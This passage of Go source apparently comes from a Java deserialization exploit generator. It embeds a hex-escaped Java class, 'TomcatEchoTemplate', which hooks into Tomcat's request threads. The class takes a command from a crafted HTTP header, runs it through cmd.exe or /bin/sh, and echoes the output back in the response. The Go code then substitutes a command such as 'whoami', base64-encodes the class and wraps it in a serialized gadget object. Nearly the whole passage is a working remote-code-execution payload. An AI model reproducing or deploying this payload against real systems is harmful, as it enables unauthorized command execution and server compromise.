5\x61\x64\x3b\x01\x00\x04\x76\x61\x72\x36\x01\x00\x04\x76\x61\x72\x34\x01\x00\x01\x5a\x01\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x3b\x01\x00\x01\x65\x07\x00\xe1\x07\x00\xc0\x07\x00\xb8\x07\x00\xba\x07\x00\x7b\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c\x65\x01\x00\x17\x54\x6f\x6d\x63\x61\x74\x45\x63\x68\x6f\x54\x65\x6d\x70\x6c\x61\x74\x65\x2e\x6a\x61\x76\x61\x0c\x00\x4d\x00\x4e\x01\x00\x24\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x74\x6f\x6d\x63\x61\x74\x2e\x75\x74\x69\x6c\x2e\x62\x75\x66\x2e\x42\x79\x74\x65\x43\x68\x75\x6e\x6b\x0c\x00\xe2\x00\xe3\x0c\x00\xe4\x00\xe5\x01\x00\x08\x73\x65\x74\x42\x79\x74\x65\x73\x01\x00\x0f\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x0c\x00\xe6\x00\x59\x0c\x00\xe7\x00\xe8\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x49\x6e\x74\x65\x67\x65\x72\x0c\x00\x4d\x00\xe9\x07\x00\xea\x0c\x00\xeb\x00\xec\x0c\x00\xed\x00\xee\x01\x00\x07\x64\x6f\x57\x72\x69\x74\x65\x0c\x00\xef\x00\xe8\x01\x00\x1f\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4e\x6f\x53\x75\x63\x68\x4d\x65\x74\x68\x6f\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x01\x00\x13\x6a\x61\x76\x61\x2e\x6e\x69\x6f\x2e\x42\x79\x74\x65\x42\x75\x66\x66\x65\x72\x01\x00\x04\x77\x72\x61\x70\x0c\x00\xf0\x00\xf1\x01\x00\x1e\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4e\x6f\x53\x75\x63\x68\x46\x69\x65\x6c\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x0c\x00\xf2\x00\xee\x0c\x00\x4d\x00\xf3\x07\x00\xdf\x0c\x00\xf4\x00\xf5\x0c\x00\xf6\x00\xf7\x07\x00\xe1\x0c\x00\xf8\x00\xf9\x0c\x00\xfa\x00\xfb\x01\x00\x07\x74\x68\x72\x65\x61\x64\x73\x0c\x00\x64\x00\x65\x0c\x00\xfc\x00\xfd\x01\x00\x04\x65\x78\x65\x63\x0c\x00\xfe\x00\xff\x01\x00\x04\x68\x74\x74\x70\x01\x00\x06\x74\x61\x72\x67\x65\x74\x01\x00\x12\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x6e\x61\x62\x6c\x65\x01\x00\x06\x74\x68\x69\x73\x24\x30\x01\x00\x07\x68\x61\x6e\x64\x6c\x65\x72\x01\x00\x06\x67\x6c\x6f\x62\x61\x6c\x01\x00\x13\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x01\x00\x0a\x70\x72\x6f\x63\x65\x73\x73\x6f\x72\x73\x01\x00\x0e\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x0c\x01\x00\x01\x01\x0c\x00\xf6\x01\x02\x01\x00\x03\x72\x65\x71\x01\x00\x0b\x67\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65\x01\x00\x09\x67\x65\x74\x48\x65\x61\x64\x65\x72\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x01\x00\x0f\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x01\x00\x06\x77\x68\x6f\x61\x6d\x69\x01\x00\x0e\x7a\x68\x2d\x43\x4e\x2c\x7a\x68\x3b\x71\x3d\x31\x2e\x39\x0c\x01\x03\x01\x04\x01\x00\x09\x73\x65\x74\x53\x74\x61\x74\x75\x73\x01\x00\x07\x6f\x73\x2e\x6e\x61\x6d\x65\x07\x01\x05\x0c\x01\x06\x01\x07\x0c\x01\x08\x00\xfd\x01\x00\x06\x77\x69\x6e\x64\x6f\x77\x01\x00\x07\x63\x6d\x64\x2e\x65\x78\x65\x01\x00\x02\x2f\x63\x01\x00\x07\x2f\x62\x69\x6e\x2f\x73\x68\x01\x00\x02\x2d\x63\x01\x00\x11\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x53\x63\x61\x6e\x6e\x65\x72\x01\x00\x18\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x42\x75\x69\x6c\x64\x65\x72\x0c\x00\x4d\x01\x09\x0c\x01\x0a\x01\x0b\x07\x01\x0c\x0c\x01\x0d\x01\x0e\x0c\x00\x4d\x01\x0f\x01\x00\x02\x5c\x41\x0c\x01\x10\x01\x11\x0c\x01\x12\x00\xfd\x0c\x01\x13\x01\x14\x0c\x00\x54\x00\x55\x0c\x01\x15\x00\x4e\x01\x00\x12\x54\x6f\x6d\x63\x61\x74\x45\x63\x68\x6f\x54\x65\x6d\x70\x6c\x61\x74\x65\x01\x00\x2f\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x78\x73\x6c\x74\x63\x2f\x72\x75\x6e\x74\x69\x6d\x65\x2f\x41\x62\x73\x74\x72\x61\x63\x74\x54\x72\x61\x6e\x73\x6c\x65\x74\x01\x00\x14\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x62\x6c\x65\x01\x00\x17\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x01\x00\x28\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x78\x73\x6c\x74\x63\x2f\x54\x72\x61\x6e\x73\x6c\x65\x74\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x01\x00\x07\x66\x6f\x72\x4e\x61\x6d\x65\x01\x00\x25\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x01\x00\x0b\x6e\x65\x77\x49\x6e\x73\x74\x61\x6e\x63\x65\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x04\x54\x59\x50\x45\x01\x00\x11\x67\x65\x74\x44\x65\x63\x6c\x61\x72\x65\x64\x4d\x65\x74\x68\x6f\x64\x01\x00\x40\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x4d\x65\x74\x68\x6f\x64\x3b\x01\x00\x04\x28\x49\x29\x56\x01\x00\x18\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x4d\x65\x74\x68\x6f\x64\x01\x00\x06\x69\x6e\x76\x6f\x6b\x65\x01\x00\x39\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x08\x67\x65\x74\x43\x6c\x61\x73\x73\x01\x00\x13\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x01\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x01\x00\x10\x67\x65\x74\x44\x65\x63\x6c\x61\x72\x65\x64\x46\x69\x65\x6c\x64\x01\x00\x2d\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x3b\x01\x00\x0d\x67\x65\x74\x53\x75\x70\x65\x72\x63\x6c\x61\x73\x73\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x0d\x73\x65\x74\x41\x63\x63\x65\x73\x73\x69\x62\x6c\x65\x01\x00\x04\x28\x5a\x29\x56\x01\x00\x03\x67\x65\x74\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x0d\x63\x75\x72\x72\x65\x6e\x74\x54\x68\x72\x65\x61\x64\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x3b\x01\x00\x0e\x67\x65\x74\x54\x68\x72\x65\x61\x64\x47\x72\x6f\x75\x70\x01\x00\x19\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x47\x72\x6f\x75\x70\x3b\x01\x00\x07\x67\x65\x74\x4e\x61\x6d\x65\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x08\x63\x6f\x6e\x74\x61\x69\x6e\x73\x01\x00\x1b\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x68\x61\x72\x53\x65\x71\x75\x65\x6e\x63\x65\x3b\x29\x5a\x01\x00\x04\x73\x69\x7a\x65\x01\x00\x03\x28\x29\x49\x01\x00\x15\x28\x49\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x06\x65\x71\x75\x61\x6c\x73\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x5a\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x79\x73\x74\x65\x6d\x01\x00\x0b\x67\x65\x74\x50\x72\x6f\x70\x65\x72\x74\x79\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x0b\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65\x01\x00\x16\x28\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x05\x73\x74\x61\x72\x74\x01\x00\x15\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x3b\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x01\x00\x0e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x17\x28\x29\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x01\x00\x18\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x29\x56\x01\x00\x0c\x75\x73\x65\x44\x65\x6c\x69\x6d\x69\x74\x65\x72\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x53\x63\x61\x6e\x6e\x65\x72\x3b\x01\x00\x04\x6e\x65\x78\x74\x01\x00\x08\x67\x65\x74\x42\x79\x74\x65\x73\x01\x00\x04\x28\x29\x5b\x42\x01\x00\x0f\x70\x72\x69\x6e\x74\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x00\x21\x00\x4a\x00\x4b\x00\x01\x00\x4c\x00\x00\x00\x06\x00\x01\x00\x4d\x00\x4e\x00\x01\x00\x4f\x00\x00\x00\x2f\x00\x01\x00\x01\x00\x00\x00\x05\x2a\xb7\x00\x01\xb1\x00\x00\x00\x02\x00\x50\x00\x00\x00\x06\x00\x01\x00\x00\x00\x0d\x00\x51\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00\x52\x00\x53\x00\x00\x00\x0a\x00\x54\x00\x55\x00\x02\x00\x4f\x00\x00\x01\x57\x00\x08\x00\x05\x00\x00\x00\xae\x12\x02\xb8\x00\x03\x4e\x2d\xb6\x00\x04\x4d\x2d\x12\x05\x06\xbd\x00\x06\x59\x03\x12\x07\x53\x59\x04\xb2\x00\x08\x53\x59\x05\xb2\x00\x08\x53\xb6\x00\x09\x2c\x06\xbd\x00\x0a\x59\x03\x2b\x53\x59\x04\xbb\x00\x0b\x59\x03\xb7\x00\x0c\x53\x59\x05\xbb\x00\x0b\x59\x2b\xbe\xb7\x00\x0c\x53\xb6\x00\x0d\x57\x2a\xb6\x00\x0e\x12\x0f\x04\xbd\x00\x06\x59\x03\x2d\x53\xb6\x00\x10\x2a\x04\xbd\x00\x0a\x59\x03\x2c\x53\xb6\x00\x0d\x57\xa7\x00\x45\x3a\x04\x12\x12\xb8\x00\x03\x4e\x2d\x12\x13\x04\xbd\x00\x06\x59\x03\x12\x07\x53\xb6\x00\x09\x2d\x04\xbd\x00\x0a\x59\x03\x2b\x53\xb6\x00\x0d\x4d\x2a\xb6\x00\x0e\x12\x0f\x04\xbd\x00\x06\x59\x03\x2d\x53\xb6\x00\x10\x2a\x04\xbd\x00\x0a\x59\x03\x2c\x53\xb6\x00\x0d\x57\xb1\x00\x01\x00\x00\x00\x68\x00\x6b\x00\x11\x00\x03\x00\x50\x00\x00\x00\x2a\x00\x0a\x00\x00\x00\x44\x00\x06\x00\x45\x00\x0b\x00\x46\x00\x4a\x00\x47\x00\x68\x00\x4c\x00\x6b\x00\x48\x00\x6d\x00\x49\x00\x73\x00\x4a\x00\x8f\x00\x4b\x00\xad\x00\x4e\x00\x51\x00\x00\x00\x48\x00\x07\x00\x0b\x00\x60\x00\x56\x00\x57\x00\x02\x00\x06\x00\x65\x00\x58\x00\x59\x00\x03\x00\x6d\x00\x40\x00\x5a\x00\x5b\x00\x04\x00\x00\x00\xae\x00\x5c\x00\x57\x00\x00\x00\x00\x00\xae\x00\x5d\x00\x5e\x00\x01\x00\x8f\x00\x1f\x00\x56\x00\x57\x00\x02\x00\x73\x00\x3b\x00\x58\x00\x59\x00\x03\x00\x5f\x00\x00\x00\x11\x00\x02\xf7\x00\x6b\x07\x00\x60\xfd\x00\x41\x07\x00\x61\x07\x00\x62\x00\x63\x00\x00\x00\x04\x00\x01\x00\x28\x00\x0a\x00\x64\x00\x65\x00\x02\x00\x4f\x00\x00\x00\xd5\x00\x03\x00\x05\x00\x00\x00\x38\x01\x4d\x2a\xb6\x00\x0e\x4e\x2d\x12\x0a\xa5\x00\x16\x2d\x2b\xb6\x00\x14\x4d\xa7\x00\x0d\x3a\x04\x2d\xb6\x00\x16\x4e\xa7\xff\xea\x2c\xc7\x00\x0c\xbb\x00\x15\x59\x2b\xb7\x00\x17\xbf\x2c\x04\xb6\x00\x18\x2c\x2a\xb6\x00\x19\xb0\x00\x01\x00\x0d\x00\x13\x00\x16\x00\x15\x00\x03\x00\x50\x00\x00\x00\x32\x00\x0c\x00\x00\x00\x51\x00\x02\x00\x52\x00\x07\x00\x54\x00\x0d\x00\x56\x00\x13\x00\x57\x00\x16\x00\x58\x00\x18\x00\x59\x00\x1d\x00\x5a\x00\x20\x00\x5d\x00\x24\x00\x5e\x00\x2d\x00\x60\x00\x32\x00\x61\x00\x51\x00\x00\x00\x34\x00\x05\x00\x18\x00\x05\x00\x5a\x00\x66\x00\x04\x00\x00\x00\x38\x00\x5c\x00\x57\x00\x00\x00\x00\x00\x38\x00\x5d\x00\x67\x00\x01\x00\x02\x00\x36\x00\x56\x00\x68\x00\x02\x00\x07\x00\x31\x00\x58\x00\x59\x00\x03\x00\x5f\x00\x00\x00\x11\x00\x04\xfd\x00\x07\x07\x00\x69\x07\x00\x62\x4e\x07\x00\x6a\x09\x0c\x00\x63\x00\x00\x00\x04\x00\x01\x00\x28\x00\x01\x00\x6b\x00\x6c\x00\x02\x00\x4f\x00\x00\x00\x3f\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x50\x00\x00\x00\x06\x00\x01\x00\x00\x00\x68\x00\x51\x00\x00\x00\x20\x00\x03\x00\x00\x00\x01\x00\x52\x00\x53\x00\x00\x00\x00\x00\x01\x00\x6d\x00\x6e\x00\x01\x00\x00\x00\x01\x00\x6f\x00\x70\x00\x02\x00\x63\x00\x00\x00\x04\x00\x01\x00\x71\x00\x01\x00\x6b\x00\x72\x00\x02\x00\x4f\x00\x00\x00\x49\x00\x00\x00\x04\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x50\x00\x00\x00\x06\x00\x01\x00\x00\x00\x6d\x00\x51\x00\x00\x00\x2a\x00\x04\x00\x00\x00\x01\x00\x52\x00\x53\x00\x00\x00\x00\x00\x01\x00\x6d\x00\x6e\x00\x01\x00\x00\x00\x01\x00\x73\x00\x74\x00\x02\x00\x00\x00\x01\x00\x75\x00\x76\x00\x03\x00\x63\x00\x00\x00\x04\x00\x01\x00\x71\x00\x08\x00\x77\x00\x4e\x00\x01\x00\x4f\x00\x00\x03\x3a\x00\x08\x00\x0c\x00\x00\x01\x9b\x03\x3b\xb8\x00\x1a\xb6\x00\x1b\x12\x1c\xb8\x00\x1d\xc0\x00\x1e\xc0\x00\x1e\x4c\x03\x3d\x1c\x2b\xbe\xa2\x01\x79\x2b\x1c\x32\x4e\x2d\xc6\x01\x6b\x2d\xb6\x00\x1f\x3a\x04\x19\x04\x12\x20\xb6\x00\x21\x9a\x01\x5b\x19\x04\x12\x22\xb6\x00\x21\x99\x01\x51\x2d\x12\x23\xb8\x00\x1d\x3a\x05\x19\x05\xc1\x00\x24\x99\x01\x41\x19\x05\x12\x25\xb8\x00\x1d\x12\x26\xb8\x00\x1d\x12\x27\xb8\x00\x1d\x3a\x05\xa7\x00\x08\x3a\x06\xa7\x01\x26\x19\x05\x12\x29\xb8\x00\x1d\xc0\x00\x2a\x3a\x06\x03\x36\x07\x15\x07\x19\x06\xb9\x00\x2b\x01\x00\xa2\x01\x04\x19\x06\x15\x07\xb9\x00\x2c\x02\x00\x3a\x08\x19\x08\x12\x2d\xb8\x00\x1d\x3a\x05\x19\x05\xb6\x00\x0e\x12\x2e\x03\xbd\x00\x06\xb6\x00\x10\x19\x05\x03\xbd\x00\x0a\xb6\x00\x0d\x3a\x09\x19\x05\xb6\x00\x0e\x12\x2f\x04\xbd\x00\x06\x59\x03\x12\x30\x53\xb6\x00\x10\x19\x05\x04\xbd\x00\x0a\x59\x03\x12\x31\x53\xb6\x00\x0d\xc0\x00\x30\x3a\x0a\x12\x32\x3a\x04\x19\x0a\xc6\x00\x9b\x19\x0a\x12\x33\xb6\x00\x34\x99\x00\x91\x19\x09\xb6\x00\x0e\x12\x35\x04\xbd\x00\x06\x59\x03\xb2\x00\x08\x53\xb6\x00\x10\x19\x09\x04\xbd\x00\x0a\x59\x03\xbb\x00\x0b\x59\x11\x00\xc8\xb7\x00\x0c\x53\xb6\x00\x0d\x57\x12\x36\xb8\x00\x37\xb6\x00\x38\x12\x39\xb6\x00\x21\x99\x00\x19\x06\xbd\x00\x30\x59\x03\x12\x3a\x53\x59\x04\x12\x3b\x53\x59\x05\x19\x04\x53\xa7\x00\x16\x06\xbd\x00\x30\x59\x03\x12\x3c\x53\x59\x04\x12\x3d\x53\x59\x05\x19\x04\x53\x3a\x0b\x19\x09\xbb\x00\x3e\x59\xbb\x00\x3f\x59\x19\x0b\xb7\x00\x40\xb6\x00\x41\xb6\x00\x42\xb7\x00\x43\x12\x44\xb6\x00\x45\xb6\x00\x46\xb6\x00\x47\xb8\x00\x48\x04\x3b\x1a\x99\x00\x06\xa7\x00\x09\x84\x07\x01\xa7\xfe\xf6\x1a\x99\x00\x06\xa7\x00\x09\x84\x02\x01\xa7\xfe\x87\xa7\x00\x08\x4b\x2a\xb6\x00\x49\xb1\x00\x02\x00\x4e\x00\x61\x00\x64\x00\x28\x00\x00\x01\x92\x01\x95\x00\x28\x00\x03\x00\x50\x00\x00\x00\x8e\x00\x23\x00\x00\x00\x10\x00\x02\x00\x11\x00\x14\x00\x13\x00\x1c\x00\x14\x00\x20\x00\x15\x00\x24\x00\x16\x00\x2a\x00\x17\x00\x3e\x00\x18\x00\x46\x00\x19\x00\x4e\x00\x1b\x00\x61\x00\x1e\x00\x64\x00\x1c\x00\x66\x00\x1d\x00\x69\x00\x20\x00\x75\x00\x22\x00\x84\x00\x23\x00\x8f\x00\x24\x00\x98\x00\x25\x00\xb1\x00\x26\x00\xd7\x00\x27\x00\xdb\x00\x28\x00\xea\x00\x29\x01\x15\x00\x2a\x01\x50\x00\x2b\x01\x76\x00\x2c\x01\x78\x00\x2f\x01\x7c\x00\x30\x01\x7f\x00\x22\x01\x85\x00\x34\x01\x89\x00\x35\x01\x8c\x00\x13\x01\x92\x00\x3d\x01\x95\x00\x3b\x01\x96\x00\x3c\x01\x9a\x00\x3e\x00\x51\x00\x00\x00\x8e\x00\x0e\x00\x66\x00\x03\x00\x78\x00\x79\x00\x06\x01\x50\x00\x28\x00\x7a\x00\x7b\x00\x0b\x00\x8f\x00\xf0\x00\x7c\x00\x57\x00\x08\x00\xb1\x00\xce\x00\x56\x00\x57\x00\x09\x00\xd7\x00\xa8\x00\x7d\x00\x67\x00\x0a\x00\x78\x01\x0d\x00\x7e\x00\x7f\x00\x07\x00\x75\x01\x17\x00\x80\x00\x81\x00\x06\x00\x46\x01\x46\x00\x5d\x00\x57\x00\x05\x00\x2a\x01\x62\x00\x58\x00\x67\x00\x04\x00\x20\x01\x6c\x00\x82\x00\x83\x00\x03\x00\x16\x01\x7c\x00\x84\x00\x7f\x00\x02\x00\x02\x01\x90\x00\x85\x00\x86\x00\x00\x00\x14\x01\x7e\x00\x5a\x00\x87\x00\x01\x01\x96\x00\x04\x00\x88\x00\x79\x00\x00\x00\x5f\x00\x00\x00\x55\x00\x0d\xfe\x00\x16\x01\x07\x00\x1e\x01\xff\x00\x4d\x00\x06\x01\x07\x00\x1e\x01\x07\x00\x89\x07\x00\x8a\x07\x00\x61\x00\x01\x07\x00\x8b\x04\xfd\x00\x0e\x07\x00\x8c\x01\xfe\x00\xc2\x07\x00\x61\x07\x00\x61\x07\x00\x8a\x52\x07\x00\x8d\x29\xf8\x00\x06\xfa\x00\x05\xff\x00\x06\x00\x03\x01\x07\x00\x1e\x01\x00\x00\xf8\x00\x05\x42\x07\x00\x8b\x04\x00\x01\x00\x8e\x00\x00\x00\x02\x00\x8f")
		zw := "whoami"
		//echoTmplClass, _ := ioutil.ReadFile("templateClass/TomcatEchoTemplate.class")
		echoTmplClassRep := RepCmd(echoTmplClass, zw, "whoami")

		//ioutil.WriteFile("templateClass/TomcatEchoTemplate_rep.class", echoTmplClassRep, 0666)
		base64Tmpl := codec.EncodeBase64(echoTmplClassRep)
		cmdTmp := map[string]interface{}{
			"Base64Tmpl": base64Tmpl,
			"size":       len(echoTmplClassRep),
		}
		var buf bytes.Buffer
		tmpp.Execute(&buf, cmdTmp)
		r, err := yserx.FromJson(buf.Bytes())
		return r[0], err
	}
}
